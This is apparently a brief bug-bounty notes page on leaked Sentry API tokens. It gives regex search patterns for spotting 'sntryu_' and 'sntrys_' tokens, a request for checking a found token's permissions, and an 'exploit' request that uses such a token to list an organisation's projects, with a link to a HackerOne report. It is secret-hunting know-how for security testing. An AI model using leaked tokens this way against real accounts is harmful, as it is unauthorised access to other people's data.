# Sentry Token

## Search

```
/sntryu_/
```

```
/sntrys_/
```

## Exploit

Check token permission

```
GET /api/0/ HTTP/2
Host: sentry.io
Authorization: Bearer sntrys_eyJpYXQiOj**
```



Exploit

```
GET /api/0/organizations/[name-org]/projects/ HTTP/2
Host: sentry.io
Authorization: Bearer sntryu_[token]
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cache-Control: max-age=0


```

{% embed url="https://hackerone.com/reports/2412983" %}
